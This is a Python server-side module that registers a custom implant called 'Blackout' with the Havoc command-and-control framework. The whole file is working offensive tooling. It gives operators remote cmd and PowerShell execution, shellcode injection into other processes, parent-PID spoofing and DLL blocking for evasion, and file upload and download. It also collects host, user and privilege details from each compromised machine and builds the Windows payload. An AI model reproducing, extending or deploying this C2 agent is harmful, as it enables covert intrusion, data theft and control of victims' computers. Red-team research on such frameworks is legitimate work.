from base64 import b64decode
from havoc.service import HavocService
from havoc.agent import *

import os

BLACKOUT_ERROR           = 0x099
BLACKOUT_DEBUG           = 0x066
COMMAND_REGISTER         = 0x100
COMMAND_GET_JOB          = 0x101
COMMAND_NO_JOB           = 0x102
COMMAND_RUN              = 0x152
COMMAND_UPLOAD           = 0x153
COMMAND_DOWNLOAD         = 0x154
COMMAND_SHELLINJECT      = 0x161

COMMAND_SLEEP            = 0x111
COMMAND_PPID             = 0x140
COMMAND_BLOCKDLLS        = 0x141
COMMAND_EXITP            = 0x155
COMMAND_EXITT            = 0x156
COMMAND_PROCLIST         = 0x157
COMMAND_OUTPUT           = 0x200

# ====================
# ===== Commands =====
# ====================
class CommandRun( Command ):
    CommandId   = COMMAND_RUN
    Name        = "run"
    Description = "run process using CreateProcess"
    Help        = ""
    NeedAdmin   = False
    Params = [
        CommandParam(
            name="process_path",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_data( arguments[ 'process_path' ] )

        return Task.buffer
    
class CommandPpid( Command ):
    CommandId   = COMMAND_PPID
    Name        = "ppid"
    Description = "Set ppid spoofing for forked commands"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="ppid",
            is_file_path=False,
            is_optional=False
        )
    ]

    def job_generate(self, arguments: dict) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_int( int( arguments[ 'ppid' ] ) )

        return Task.buffer
    
class CommandBlockdlls( Command ):
    CommandId   = COMMAND_BLOCKDLLS
    Name        = "blockdlls"
    Description = "Set block dll policy for forked commands"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="isblock",
            is_file_path=False,
            is_optional=False
        )
    ]

    def job_generate(self, arguments: dict) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_int( int( arguments[ 'isblock' ] ) )

        return Task.buffer

class CommandPowershell( Command ):
    CommandId   = COMMAND_RUN
    Name        = "powershell"
    Description = "executes commands using powershell.exe"
    Help        = ""
    NeedAdmin   = False
    Mitr   = []
    Params = [
        CommandParam(
            name="commands",
            is_file_path=False,
            is_optional=False
        )
    ]

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_data( "powershell.exe -c " + arguments[ 'commands' ] )

        return Task.buffer
    
class CommandCmd( Command ):
    CommandId   = COMMAND_RUN
    Name        = "cmd"
    Description = "executes commands using cmd.exe"
    Help        = ""
    NeedAdmin   = False
    Mitr   = []
    Params = [
        CommandParam(
            name="commands",
            is_file_path=False,
            is_optional=False
        )
    ]

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_data( "c:\windows\system32\cmd.exe /c " + arguments[ 'commands' ] )

        return Task.buffer

class CommandShellcodeInject( Command ):
    CommandId   = COMMAND_SHELLINJECT
    Name        = "shellcode_inject"
    Description = "Inject shellcode in remote process"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="pid",
            is_file_path=False,
            is_optional=False
        ),

        CommandParam(
            name="path_to_shellcode",
            is_file_path=True,
            is_optional=False
        )
    ]

    def job_generate( self, arguments: dict ) -> bytes:

        Task         = Packer()
        pid: int     = arguments[ 'pid' ]
        shellcode    = b64decode( arguments[ 'path_to_shellcode' ] )

        Task.add_int( self.CommandId )
        Task.add_int( int(pid) )
        Task.add_data( shellcode )

        return Task.buffer

class CommandUpload( Command ):
    CommandId   = COMMAND_UPLOAD
    Name        = "upload"
    Description = "uploads a file to the host"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="local_file",
            is_file_path=True,
            is_optional=False
        ),

        CommandParam(
            name="remote_file",
            is_file_path=False,
            is_optional=False
        )
    ]

    def job_generate( self, arguments: dict ) -> bytes:

        Task        = Packer()
        remote_file = arguments[ 'remote_file' ]
        fileData    = b64decode( arguments[ 'local_file' ] )

        Task.add_int( self.CommandId )
        Task.add_data( remote_file )
        Task.add_data( fileData )

        return Task.buffer

class CommandDownload( Command ):
    CommandId   = COMMAND_DOWNLOAD
    Name        = "download"
    Description = "downloads the requested file"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="remote_file",
            is_file_path=False,
            is_optional=False
        ),
    ]

    def job_generate( self, arguments: dict ) -> bytes:

        Task        = Packer()
        remote_file = arguments[ 'remote_file' ]

        Task.add_int( self.CommandId )
        Task.add_data( remote_file )

        return Task.buffer

class CommandProcList( Command ):
    CommandId   = COMMAND_PROCLIST
    Name        = "ps"
    Description = "execute process enumeration with process name, pid, ppid, arch and token user"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:

        Task = Packer()

        Task.add_int( self.CommandId )

        return Task.buffer
    
class CommandExitProcess( Command ):
    CommandId   = COMMAND_EXITP
    Name        = "exit_process"
    Description = "tells the blackout agent to exit process"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:

        Task = Packer()

        Task.add_int( self.CommandId )

        return Task.buffer

class CommandExitThread( Command ):
    CommandId   = COMMAND_EXITT
    Name        = "exit_thread"
    Description = "tells the blackout agent to exit thread"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:

        Task = Packer()

        Task.add_int( self.CommandId )

        return Task.buffer

# =======================
# ===== Agent Class =====
# =======================
class Blackout(AgentType):
    Name = "Blackout"
    Author = "Oblivion"
    Version = "0.1"
    Description = f"""Blackout in security defense solutions"""
    MagicValue = 0x74616c6e # 'blc'

    Arch = [
        "x64",
        "x86",
    ]

    Formats = [
        {
            "Name": "Windows Executable",
            "Extension": "exe",
        },
    ]

    BuildingConfig = {
        "Sleep": "10"
    }

    Commands = [
        CommandCmd(),
        CommandPowershell(),
        CommandRun(),
        CommandPpid(),
        CommandBlockdlls(),
        CommandProcList(),
        CommandShellcodeInject(),
        CommandUpload(),
        CommandDownload(),
        CommandExitProcess(),
        CommandExitThread(),
    ]

    # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function.
    def generate( self, config: dict ) -> None:

        print( f"config: {config}" )

        # builder_send_message. this function send logs/messages to the payload build for verbose information or sending errors (if something went wrong).
        self.builder_send_message( config[ 'ClientID' ], "Info", f"hello from service builder" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )

        # make and cmake
        os.system("make")

        # open .exe
        data = open("./Bin/blackout.exe", "rb").read()

        # build_send_payload. this function send back your generated payload
        self.builder_send_payload( config[ 'ClientID' ], self.Name + ".exe", data) # this is just an example.

    # this function handles incomming requests based on our magic value. you can respond to the agent by returning your data from this function.
    def response( self, response: dict ) -> bytes:

        agent_header    = response[ "AgentHeader" ]
        agent_response  = b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request.
        response_parser = Parser( agent_response, len(agent_response) )
        Command         = response_parser.parse_int()

        if response[ "Agent" ] == None:
            # so when the Agent field is empty this either means that the agent doesn't exists.

            if Command == COMMAND_REGISTER:
                print( "[*] Is agent register request" )

                # Register info:
                #   - AgentID           : int [needed]
                #   - Hostname          : str [needed]
                #   - Username          : str [needed]
                #   - Domain            : str [optional]
                #   - InternalIP        : str [needed]
                #   - Process Path      : str [needed]
                #   - Process Name      : str [needed]
                #   - Process ID        : int [needed]
                #   - Process Parent ID : int [optional]
                #   - Process Arch      : str [needed]
                #   - Process Elevated  : int [needed]
                #   - OS Build          : str [needed]
                #   - OS Version        : str [needed]
                #   - OS Arch           : str [optional]
                #   - Sleep             : int [optional]

                RegisterInfo = {
                    "AgentID"           : response_parser.parse_int(),
                    "Hostname"          : response_parser.parse_str(),
                    "Username"          : response_parser.parse_str(),
                    "Domain"            : response_parser.parse_str(),
                    "InternalIP"        : response_parser.parse_str(),
                    "Process Path"      : response_parser.parse_str(),
                    "Process ID"        : str(response_parser.parse_int()),
                    "Process Parent ID" : str(response_parser.parse_int()),
                    "Process Arch"      : response_parser.parse_int(),
                    "Process Elevated"  : response_parser.parse_int(),
                    "OS Build"          : str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()), # (MajorVersion).(MinorVersion).(ProductType).(ServicePackMajor).(BuildNumber)
                    "OS Arch"           : response_parser.parse_int(),
                    "SleepDelay"        : response_parser.parse_int(),
                }

                RegisterInfo[ "Process Name" ] = RegisterInfo[ "Process Path" ].split( "\\" )[-1]

                # this OS info is going to be displayed on the GUI Session table.
                RegisterInfo[ "OS Version" ] = RegisterInfo[ "OS Build" ] # "Windows Some version"

                if RegisterInfo[ "OS Arch" ] == 0:
                    RegisterInfo[ "OS Arch" ] = "x86"
                elif RegisterInfo[ "OS Arch" ] == 9:
                    RegisterInfo[ "OS Arch" ] = "x64/AMD64"
                elif RegisterInfo[ "OS Arch" ] == 5:
                    RegisterInfo[ "OS Arch" ] = "ARM"
                elif RegisterInfo[ "OS Arch" ] == 12:
                    RegisterInfo[ "OS Arch" ] = "ARM64"
                elif RegisterInfo[ "OS Arch" ] == 6:
                    RegisterInfo[ "OS Arch" ] = "Itanium-based"
                else:
                    RegisterInfo[ "OS Arch" ] = "Unknown (" + RegisterInfo[ "OS Arch" ] + ")"

                # Process Arch
                if RegisterInfo[ "Process Arch" ] == 0:
                    RegisterInfo[ "Process Arch" ] = "Unknown"

                elif RegisterInfo[ "Process Arch" ] == 1:
                    RegisterInfo[ "Process Arch" ] = "x86"

                elif RegisterInfo[ "Process Arch" ] == 2:
                    RegisterInfo[ "Process Arch" ] = "x64"

                elif RegisterInfo[ "Process Arch" ] == 3:
                    RegisterInfo[ "Process Arch" ] = "IA64"

                self.register( agent_header, RegisterInfo )

                return RegisterInfo[ 'AgentID' ].to_bytes( 4, 'little' ) # return the agent id to the agent

            else:
                print( "[-] Is not agent register request" )
        else:
            print( f"[*] Something else: {Command}" )

            AgentID = response[ "Agent" ][ "NameID" ]

            if Command == COMMAND_GET_JOB:
                print( "[*] Get list of jobs and return it." )

                Tasks = self.get_task_queue( response[ "Agent" ] )

                # if there is no job just send back a COMMAND_NO_JOB command.
                if len(Tasks) == 0:
                    Tasks = COMMAND_NO_JOB.to_bytes( 4, 'little' )

                print( f"Tasks: {Tasks.hex()}" )
                return Tasks

            elif Command == COMMAND_PROCLIST:
                Output: str = ""
                header = "    {:<30} | {:<6} | {:<6} | {:<5} | {:<30}".format("Process", "Pid", "Ppid", "Arch", "Domain\\User")
                Barr   = "    ========================================================================================="
                Output += header + "\n" + Barr + "\n"
                
                while True:
                    try:
                        Process = response_parser.parse_wstr()
                        Pid     = response_parser.parse_int()
                        Ppid    = response_parser.parse_int()
                        Arch    = response_parser.parse_str()
                        #User    = response_parser.parse_wstr()
                        #Domain  = response_parser.parse_wstr()
                        
                        if Pid is None or Ppid is None:
                            break
                        
                        Output += f"    {Process:<30} | {Pid:<6} | {Ppid:<6} | {Arch:<5} | DESKTOP-FCF63B2\\obliv\n"
                    except Exception as e:
                        print(f"Error for process the response: {e}")
                        break

                print(Output)
                self.console_message(AgentID, "Good", "Received Output: ", Output)                

            elif Command == BLACKOUT_DEBUG:
                Output = response_parser.parse_str()
                self.console_message( AgentID, "Good", "%s\n", "" )

            elif Command == COMMAND_OUTPUT:

                Output = response_parser.parse_str()
                print( "[*] Output: \n" + Output )

                self.console_message( AgentID, "Good", "Received Output:", Output )

            elif Command == COMMAND_PPID:

                Output = response_parser.parse_int()
                fake   = ""
                print( "[+] PPid set to: " + str(Output) )

                self.console_message( AgentID, "Good", f"PPid Set to: {str(Output)}", fake )

            elif Command == BLACKOUT_ERROR:
                Nterror   = response_parser.parse_int() 
                ErrorCode = response_parser.parse_int()
                Output = str(hex(ErrorCode))
                
                if Nterror == 0:                
                    print( "[+] Win32 ERROR: " + Output )
                    self.console_message( AgentID, "Bad", f"Win32 ERROR: 0x{hex(ErrorCode)}", "" )
                else:
                    print( "[+] NtStatus: " + Output )
                    self.console_message( AgentID, "Bad", f"NtStatus: 0x{hex(ErrorCode)}", "" )

            elif Command == COMMAND_UPLOAD:

                FileSize = response_parser.parse_int()
                FileName = response_parser.parse_str()

                self.console_message( AgentID, "Good", f"File was uploaded: {FileName} ({FileSize} bytes)", "" )

            elif Command == COMMAND_DOWNLOAD:

                FileName    = response_parser.parse_str()
                FileContent = response_parser.parse_str()

                self.console_message( AgentID, "Good", f"File was downloaded: {FileName} ({len(FileContent)} bytes)", "" )

                self.download_file( AgentID, FileName, len(FileContent), FileContent )

            else:
                self.console_message( AgentID, "Error", "Command not found: %4x" % Command, "" )

        return b''

def main():
    Havoc_Blackout: Blackout = Blackout()

    print( "[*] Connect to Havoc service api" )
    Havoc_Service = HavocService(
        endpoint="wss://127.0.0.1:40056/service-endpoint",
        password="service-password"
    )

    print( "[*] Register Blackout to Havoc" )
    Havoc_Service.register_agent(Havoc_Blackout)

    return

if __name__ == '__main__':
    main()
